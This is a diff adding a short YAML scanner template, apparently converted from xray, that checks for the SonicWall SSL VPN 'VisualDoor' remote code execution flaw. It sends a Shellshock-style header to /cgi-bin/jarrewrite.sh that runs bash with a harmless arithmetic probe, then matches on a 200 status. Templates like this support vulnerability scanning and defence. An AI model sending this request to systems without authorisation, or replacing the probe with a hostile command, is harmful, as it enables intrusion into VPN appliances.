@@ -1,0 +1,22 @@
+id: poc-yaml-sonicwall-ssl-vpn-rce
+
+info:
+  name: poc-yaml-sonicwall-ssl-vpn-rce
+  author: sharecast
+  severity: critical
+  tags: xray-converted,rce,ct-158488
+  reference:
+    - https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/jarrewrite.sh HTTP/1.1
+        Host: {{Hostname}}
+        X-Test: () { :; }; echo ; /bin/bash -c 'expr {{rand_int(1000, 9999)}} - {{rand_int(1000, 9999)}}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
